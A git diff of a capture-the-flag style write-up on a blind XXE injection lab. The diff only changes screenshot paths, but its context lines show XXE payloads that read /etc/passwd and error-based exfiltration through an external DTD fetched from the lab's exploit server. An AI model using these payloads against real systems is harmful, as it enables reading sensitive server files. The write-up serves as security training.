@@ -6,11 +6,11 @@
 
 > Viewing any item and then pressing on `check stock` while having BURPSUITE PROXY HTTP history on.
 
-![](./screenshots/check-stock.png)
+![](check-stock.png)
 
 > Viewing the `POST` request sent via HTTP history.
 
-![](./screenshots/lab6-1.png)
+![](lab6-1.png)
 
 > We see there is XML being used.
 > Trying to view the `/etc/passwd` using this payload.
@@ -22,7 +22,7 @@
 &ext;
 ```
 
-![](./screenshots/lab6-2.png)
+![](lab6-2.png)
 
 > Tying to use parameter entities instead.
 ``` XMl
@@ -33,7 +33,7 @@
 %ext;
 ```
 
-![](./screenshots/lab6-3.png)
+![](lab6-3.png)
 
 > We see that we don't see anything, hence, this might be a blind xxe injection.
 > Trying to display an error message that contains the contents of the file.
@@ -52,7 +52,7 @@
 4. `file` contains the contents of the `/etc/passwd` file, so the name of the file will be the contents of the file.
 5. Finally, use the `eval` entity which declares the `error` entity and runs it. We then use the `error` entity to view its response.
 
-![](./screenshots/lab6-4.png)
+![](lab6-4.png)
 
 > We see that we can't put it inside this document.
 > This is something we know since having a parameter entity declared in the definition of another parameter entity is only parsed through external DTD.
@@ -67,7 +67,7 @@
 %error;
 ```
 
-![](./screenshots/lab6-5.png)
+![](lab6-5.png)
 
 > Saving the URL of the exploit server, and then storing the exploit using the button `store` at the bottom.
 
@@ -80,7 +80,7 @@ https://exploit-0a4e005804d421bf82c1691e013400a4.exploit-server.net/exploit
 <!DOCTYPE foo [ <!ENTITY ext SYSTEM "https://exploit-0a4e005804d421bf82c1691e013400a4.exploit-server.net/exploit" > &ext;]>
 ```
 
-![](./screenshots/lab6-6.png)
+![](lab6-6.png)
 
 > We expect this response as we saw it above, and removed it by using parameter entities instead.
 > Modifying the external reference XML entity to be a parameter entity.
@@ -89,7 +89,7 @@ https://exploit-0a4e005804d421bf82c1691e013400a4.exploit-server.net/exploit
 <!DOCTYPE foo [ <!ENTITY % ext SYSTEM "https://exploit-0a4e005804d421bf82c1691e013400a4.exploit-server.net/exploit" > %ext;]>
 ```
 
-![](./screenshots/lab6-7.png)
+![](lab6-7.png)
 
 > We see that it tried to read the file `/nonexistent/<file contents>`, which casues an error and then prints out the error.
 
